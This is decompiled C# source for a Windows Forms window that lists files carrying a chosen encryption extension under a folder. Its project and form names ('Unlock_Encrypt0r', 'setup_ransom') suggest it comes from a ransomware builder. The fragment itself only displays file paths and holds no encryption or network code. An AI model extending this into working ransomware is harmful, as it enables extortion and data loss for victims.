using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Unlock_Encrypt0r_1._0.My;

namespace Unlock_Encrypt0r_1._0;

[DesignerGenerated]
public class Encryption : Form
{
	private IContainer components;

	[field: AccessedThroughProperty("dataGridViewEncryptedFiles")]
	private virtual DataGridView dataGridViewEncryptedFiles
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ColumnPath")]
	internal virtual DataGridViewTextBoxColumn ColumnPath
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Encryption()
	{
		((Form)this).add_Load((EventHandler)Encryption_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0093: Unknown result type (might be due to invalid IL or missing references)
		dataGridViewEncryptedFiles = new DataGridView();
		ColumnPath = new DataGridViewTextBoxColumn();
		((ISupportInitialize)dataGridViewEncryptedFiles).BeginInit();
		((Control)this).SuspendLayout();
		dataGridViewEncryptedFiles.set_BackgroundColor(Color.Gray);
		dataGridViewEncryptedFiles.set_BorderStyle((BorderStyle)2);
		dataGridViewEncryptedFiles.set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		dataGridViewEncryptedFiles.get_Columns().AddRange((DataGridViewColumn[])(object)new DataGridViewColumn[1] { (DataGridViewColumn)ColumnPath });
		((Control)dataGridViewEncryptedFiles).set_Dock((DockStyle)5);
		((Control)dataGridViewEncryptedFiles).set_Location(new Point(0, 0));
		((Control)dataGridViewEncryptedFiles).set_Margin(new Padding(4));
		((Control)dataGridViewEncryptedFiles).set_Name("dataGridViewEncryptedFiles");
		dataGridViewEncryptedFiles.set_RowHeadersWidth(51);
		((Control)dataGridViewEncryptedFiles).set_Size(new Size(800, 450));
		((Control)dataGridViewEncryptedFiles).set_TabIndex(1);
		((DataGridViewColumn)ColumnPath).set_HeaderText("Path");
		((DataGridViewColumn)ColumnPath).set_MinimumWidth(6);
		((DataGridViewColumn)ColumnPath).set_Name("ColumnPath");
		((DataGridViewColumn)ColumnPath).set_ReadOnly(true);
		((DataGridViewColumn)ColumnPath).set_Width(500);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).get_Controls().Add((Control)(object)dataGridViewEncryptedFiles);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Encryption");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Encryption");
		((Form)this).set_TopMost(true);
		((ISupportInitialize)dataGridViewEncryptedFiles).EndInit();
		((Control)this).ResumeLayout(false);
	}

	private void Encryption_Load(object sender, EventArgs e)
	{
		foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(MyProject.Forms.setup_ransom.path_folder_input.get_Text(), (SearchOption)3, new string[0]))
		{
			if (file.EndsWith(MyProject.Forms.setup_ransom.files_encryption.get_Text()))
			{
				dataGridViewEncryptedFiles.get_Rows().Add(new object[1] { file });
			}
		}
	}
}
